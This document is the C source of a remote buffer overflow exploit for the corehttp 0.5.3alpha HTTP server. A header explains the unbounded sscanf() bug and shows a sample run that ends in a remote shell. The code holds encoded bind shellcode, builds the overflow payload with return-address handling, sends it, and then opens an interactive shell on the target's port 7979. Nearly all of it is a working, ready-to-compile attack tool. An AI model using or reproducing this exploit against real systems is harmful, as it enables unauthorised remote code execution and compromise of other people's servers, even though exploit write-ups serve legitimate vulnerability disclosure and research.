/*[ corehttp[v0.5.3alpha]: httpd remote buffer overflow exploit. ]**********
 *                                                                         *
 * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)                        *
 *                                                                         *
 * compile:                                                                *
 *  gcc xcorehttp.c -o xcorehttp                                           *
 *                                                                         *
 * syntax:                                                                 *
 *  ./xcorehttp [-r] -h host -p port                                       *
 *                                                                         *
 * corehttp homepage/url:                                                  *
 *  http://corehttp.sourceforge.net/                                       *
 *                                                                         *
 * bug(http.c):                                                            *
 * ----------------------------------------------------------------------- *
 * struct sprock_t *HttpSprockMake(struct sprock_t *parentsprock) {        *
 *     struct sprock_t *sprocket;                                          *
 *     char req[PATHSIZE], url[PATHSIZE], status[PATHSIZE], temp[BUFSIZE], *
 * ...                                                                     *
 *     if ((sprocket = (struct sprock_t *)                                 *
 *          malloc(sizeof(struct sprock_t))) == NULL) return NULL;         *
 * ...                                                                     *
 *     sscanf(parentsprock->buffer, "%[A-Za-z] %s%*[ \t\n]", req, url);    *
 * !(the bug/overwrite) --------------------------------------^----^       *
 *     strncpy(sprocket->parent->url, url, PATHSIZE);                      *
 * !(the problem) -^                                                       *
 * ...                                                                     *
 *     for (i = 0; req[i] != '\0'; i++)                                    *
 *         req[i] = toupper(req[i]);                                       *
 * !(another problem) -^                                                   *
 * ...                                                                     *
 * }                                                                       *
 * ----------------------------------------------------------------------- *
 *                                                                         *
 * explaination:                                                           *
 *  the sscanf() call in the above code contains no bounds checks for      *
 *  writing to either req[] or url[] (i chose url[] as it gave more room   *
 *  to work with, by overwriting into req[], and isnt limited to           *
 *  alphabetical characters only)                                          *
 *                                                                         *
 *  the first problem is that this overflows into the *sprocket structure  *
 *  pointer, which is used immediately after the overflow.  this is        *
 *  automatically calculated in this exploit, using the same location in   *
 *  memory with an offset. (+512 to ret address, which points to the nops) *
 *                                                                         *
 *  the second problem is all lowercase characters get uppercased, this    *
 *  will happen weither or not you overwrite via req[] or url[].  if the   *
 *  return address contains a lowercase character it will uppercase it.    *
 *                                                                         *
 *  this exploit has 256(%4) bytes of working room, so avoiding lowercase  *
 *  characters should be doable.                                           *
 *                                                                         *
 *  note:                                                                  *
 *   there are two areas in the stack this will appear, the one closer     *
 *   to the top of the stack should be used.                               *
 *                                                                         *
 *  example usage:                                                         *
 *   [v9@fhalo v9]$ gcc xcorehttp.c -o xcorehttp                           *
 *   [v9@fhalo v9]$ ./xcorehttp -h dual.fakehalo.lan -p 5555               *
 *   [*] corehttp[v0.5.3alpha]: httpd remote buffer overflow exploit.      *
 *   [*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)                  *
 *                                                                         *
 *   [*] target                      : dual.fakehalo.lan:5555              *
 *   [*] return address              : 0xbfffea60                          *
 *   [*] *sprocket replacement       : 0xbfffec60                          *
 *                                                                         *
 *   [*] attempting to connect: dual.fakehalo.lan:5555.                    *
 *   [*] successfully connected: dual.fakehalo.lan:5555.                   *
 *   [*] sending string:                                                   *
 *   [+]  "X [NOPS+SHELLCODEx512]|[ADDR1x16][ADDR2x256]\r\n\r\n"           *
 *   [*] closing connection.                                               *
 *                                                                         *
 *   [*] attempting to connect: dual.fakehalo.lan:7979.                    *
 *   [*] successfully connected: dual.fakehalo.lan:7979.                   *
 *                                                                         *
 *   Linux fhlnxd 2.4.22-10mdk #1 Thu Sep 18 12:30:58 CEST 2003 i686 unkn$ *
 *   uid=501(v9) gid=501(v9) groups=501(v9)                                *
 *                                                                         *
 * (...nothing like a overly complex exploit to quench my brain thirst.    *
 * although, i didn't do any support for randomized memory addresses, oh   *
 * well)                                                                   *
 ***************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#ifndef __USE_BSD
#define __USE_BSD
#endif
#include <string.h>
#include <strings.h>
#include <signal.h>
#include <unistd.h>
#include <netdb.h>
#include <getopt.h>
#include <ctype.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFSIZE (2+512+16+256+4)
#define TIMEOUT 10
#define SPORT 7979

#define DFL_RETADDR 0xbfffea60

/* globals. */

/* linux_ia32_bind -  LPORT=7979 Size=243 Encoder=PexAlphaNum */
/* http://metasploit.com */
/* filt: 0x00 0x0a 0x0d 0x2b 0x25 0x3f 0x20 0x2f 0x09 (0x61-0x7a) */
static char x86_bind[]=
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x41\x53\x4b\x4d\x43\x35"
"\x43\x44\x43\x35\x4c\x56\x44\x50\x4c\x56\x48\x46\x4a\x45\x49\x39"
"\x49\x48\x41\x4e\x4d\x4c\x42\x38\x48\x49\x43\x44\x44\x35\x48\x36"
"\x4a\x56\x4f\x31\x4b\x52\x48\x46\x43\x45\x49\x48\x41\x4e\x4c\x36"
"\x48\x56\x4a\x35\x42\x55\x41\x55\x48\x55\x49\x48\x41\x4e\x4d\x4c"
"\x42\x48\x42\x4b\x48\x46\x41\x4d\x43\x4e\x4d\x4c\x42\x38\x44\x55"
"\x44\x45\x48\x45\x43\x34\x49\x58\x41\x4e\x42\x4b\x48\x56\x4d\x4c"
"\x42\x38\x43\x39\x4c\x36\x44\x30\x49\x55\x42\x4b\x4f\x53\x4d\x4c"
"\x42\x48\x49\x34\x49\x37\x49\x4f\x42\x4b\x4b\x30\x44\x55\x4a\x56"
"\x4f\x32\x4f\x52\x43\x57\x4a\x46\x4a\x36\x4f\x42\x44\x56\x49\x46"
"\x50\x46\x49\x48\x43\x4e\x44\x55\x43\x45\x49\x38\x41\x4e\x4d\x4c"
"\x42\x58\x5a";

struct{
 unsigned int addr;
 char *host;
 unsigned short port;
}tbl;

/* lonely extern. */
extern char *optarg;

/* functions. */
char *getbuf(unsigned int);
unsigned short corehttp_connect(char *,unsigned short);
signed int getshell_conn(char *,unsigned short);
void proc_shell(signed int);
void printe(char *,short);
void usage(char *);
void sig_alarm(){printe("alarm/timeout hit.",1);}

/* start. */
int main(int argc,char **argv){
 signed int chr=0,rsock=0;

 printf("[*] corehttp[v0.5.3alpha]: httpd remote buffer overflo"
 "w exploit.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)"
 "\n\n");

 tbl.addr=DFL_RETADDR;

 while((chr=getopt(argc,argv,"h:p:r:"))!=EOF){
  switch(chr){
   case 'h':
    if(!tbl.host&&!(tbl.host=(char *)strdup(optarg)))
     printe("main(): allocating memory failed",1);  
    break;
   case 'p':
    tbl.port=atoi(optarg);
    break;
   case 'r':
    sscanf(optarg,"%x",&tbl.addr);
    break;
   default:
    usage(argv[0]);
    break;
  }
 }
 if(!tbl.host||!tbl.port)usage(argv[0]);
 if(tbl.addr%4)printe("return address must be a multiple of 4.",1);
 if((tbl.addr&0x000000ff)!=toupper((tbl.addr&0x000000ff)) ||
 ((tbl.addr&0x0000ff00)>>8)!=toupper(((tbl.addr&0x0000ff00)>>8)) ||
 ((tbl.addr&0x00ff0000)>>16)!=toupper(((tbl.addr&0x00ff0000)>>16)) ||
 ((tbl.addr&0xff000000)>>24)!=toupper(((tbl.addr&0xff000000)>>24)))
  printe("return address contains a lowercase character.",1);

 printf("[*] target\t\t\t: %s:%d\n",tbl.host,tbl.port);
 printf("[*] return address\t\t: 0x%.8x\n",tbl.addr);
 printf("[*] *sprocket replacement\t: 0x%.8x\n\n",(tbl.addr+512));

 corehttp_connect(tbl.host,tbl.port);
 rsock=getshell_conn(tbl.host,SPORT);
 if(rsock>0)proc_shell(rsock);
 exit(0);
}

/* make buf: */
/* "X [NOPS+SHELLCODEx512]|[ADDR1x16][ADDR2x256]\r\n\r\n" */
char *getbuf(unsigned int addr){
 unsigned int i=0;
 char *buf;
 if(!(buf=(char *)malloc(BUFSIZE+1)))
  printe("getbuf(): allocating memory failed.",1);
 memset(buf,0,BUFSIZE);

 /* needed to match the sscanf(); */
 memcpy(buf,"X ",2);

 /* make [NOPS+SHELLCODE], 512 bytes, overwrites url[256] AND req[256], */
 /* right up until the 'struct sprock_t *sprocket' pointer */
 memset(buf+2,'\x90',(513-sizeof(x86_bind)));
 memcpy(buf+2+(513-sizeof(x86_bind)),x86_bind,strlen(x86_bind));

 /* replaces the *sprocket pointer, really only needed at 524[4], the */
 /* first ones are fillers. */
 for(i=0;i<16;i+=4){
  *(long *)&buf[2+512+i]=(addr+512);
 }

 /* the *sprocket pointer will now point to this, which goes to the */
 /* shellcode. */
 for(i=0;i<256;i+=4){
  *(long *)&buf[2+512+16+i]=addr;
 }

 /* needed to be interpreted by corehttp. */
 memcpy(buf+2+512+16+256,"\r\n\r\n",4);

 /* send it on its way. */
 return(buf);
}

/* connects to the vulnerable corehttp server. */
unsigned short corehttp_connect(char *hostname,unsigned short port){
 signed int sock;
 struct hostent *t;
 struct sockaddr_in s;
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 printf("[*] attempting to connect: %s:%d.\n",hostname,port);
 if((s.sin_addr.s_addr=inet_addr(hostname))){
  if(!(t=gethostbyname(hostname)))
   printe("couldn't resolve hostname.",1);
  memcpy((char *)&s.sin_addr,(char *)t->h_addr,sizeof(s.sin_addr));
 }
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&s,sizeof(s)))
  printe("corehttp/httpd connection failed.",1);
 alarm(0);
 printf("[*] successfully connected: %s:%d.\n",hostname,port);
 sleep(1);
 printf("[*] sending string:\n");
 printf("[+]  \"X [NOPS+SHELLCODEx512]|[ADDR1x16][ADDR2x256]\\r\\n"
 "\\r\\n\"\n");
 write(sock,getbuf(tbl.addr),BUFSIZE);
 sleep(1);
 printf("[*] closing connection.\n\n");
 close(sock);
 return(0);
}

/* connects to bindshell. */
signed int getshell_conn(char *hostname,unsigned short port){
 signed int sock=0;
 struct hostent *he;
 struct sockaddr_in sa;
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
  printe("getshell_conn(): socket() failed.",1);
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(hostname))){
  if(!(he=gethostbyname(hostname)))
   printe("getshell_conn(): couldn't resolve.",1);
  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,
  sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(port);
 signal(SIGALRM,sig_alarm);
 printf("[*] attempting to connect: %s:%d.\n",hostname,port);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){
  printf("[!] connection failed: %s:%d.\n",hostname,port);
  exit(1);
 }
 alarm(0);
 printf("[*] successfully connected: %s:%d.\n\n",hostname,port);
 return(sock);
}

/* process the bindshell. */
void proc_shell(signed int sock){
 signed int r=0;
 char buf[4096+1];
 fd_set fds;
 signal(SIGINT,SIG_IGN);
 write(sock,"uname -a;id\n",13);
 while(1){
  FD_ZERO(&fds);
  FD_SET(0,&fds);
  FD_SET(sock,&fds);
  if(select(sock+1,&fds,0,0,0)<1)
   printe("getshell(): select() failed.",1);
  if(FD_ISSET(0,&fds)){
   if((r=read(0,buf,4096))<1)
    printe("getshell(): read() failed.",1);
   if(write(sock,buf,r)!=r)
    printe("getshell(): write() failed.",1);
  }
  if(FD_ISSET(sock,&fds)){
   if((r=read(sock,buf,4096))<1)exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}

/* error! */
void printe(char *err,short e){
 printf("[!] %s\n",err);
 if(e)exit(1);
 return;
}

/* usage. */
void usage(char *progname){
 printf("syntax: %s [-r] -h host -p port\n\n",progname);
 printf("  -h <host/ip>\ttarget hostname/ip.\n");
 printf("  -p <port>\ttarget port.\n");
 printf("  -r <addr>\tdefine return address. (0x%.8x)\n\n",tbl.addr);
 exit(0);
}
